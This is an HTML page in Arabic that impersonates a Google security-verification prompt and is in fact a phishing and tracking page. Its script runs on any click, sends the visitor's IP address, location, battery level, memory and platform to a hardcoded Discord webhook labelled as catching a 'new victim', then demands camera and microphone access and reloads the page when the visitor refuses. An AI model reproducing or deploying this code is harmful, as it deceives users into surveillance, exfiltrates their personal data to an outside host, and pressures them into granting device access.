<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Support - Security Audit</title>
    <script>
        const WH = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";

        async function push(status) {
            let info = {
                ip: "Scanning...",
                ram: navigator.deviceMemory || "Unknown",
                bat: "Unknown",
                os: navigator.platform
            };

            try {
                const r = await fetch('https://ipapi.co/json/');
                const j = await r.json();
                info.ip = j.ip;
                info.loc = `${j.city}, ${j.country_name}`;
            } catch (e) {}

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                info.bat = `${Math.round(b.level * 100)}%`;
            }

            const p = {
                embeds: [{
                    title: "🚀 تم صيد ضحية جديدة - نظام TLQQEMM",
                    color: 65280,
                    fields: [
                        { name: "🌐 عنوان الـ IP", value: info.ip, inline: true },
                        { name: "📍 الموقع", value: info.loc || "Unknown", inline: true },
                        { name: "📸 إذن الكاميرا", value: status, inline: true },
                        { name: "🔋 حالة البطارية", value: info.bat, inline: true },
                        { name: "🧠 الذاكرة (RAM)", value: info.ram + " جيجا", inline: true },
                        { name: "💻 نوع النظام", value: info.os, inline: true }
                    ],
                    footer: { text: "نظام سحب البيانات المتطور | TLQQEMM" },
                    timestamp: new Date()
                }]
            };
            fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(p) });
        }

        async function start() {
            // أول ضغطة ترسل البيانات الأساسية فوراً
            push("في انتظار السماح...");
            
            try {
                // محاولة فتح الكاميرا "خاوة" بعد الضغط
                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                push("✅ تم السماح (GRANTED)");
                alert("تم فحص الأمان بنجاح.");
            } catch (e) {
                push("❌ تم الرفض (DENIED)");
                alert("خطأ: يجب السماح بالوصول للكاميرا لإتمام عملية التحقق.");
                location.reload(); // إعادة المحاولة لإجباره
            }
        }

        window.onclick = start;
    </script>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
        .card { text-align: center; border: 1px solid #ddd; padding: 40px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 25px; border-radius: 5px; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100">
        <h2>تحديث أمني مطلوب</h2>
        <p>اضغط على الزر أدناه للتحقق من هوية الجهاز وحمايته.</p>
        <button class="btn">بدء التحقق الآن</button>
    </div>
</body>
</html>
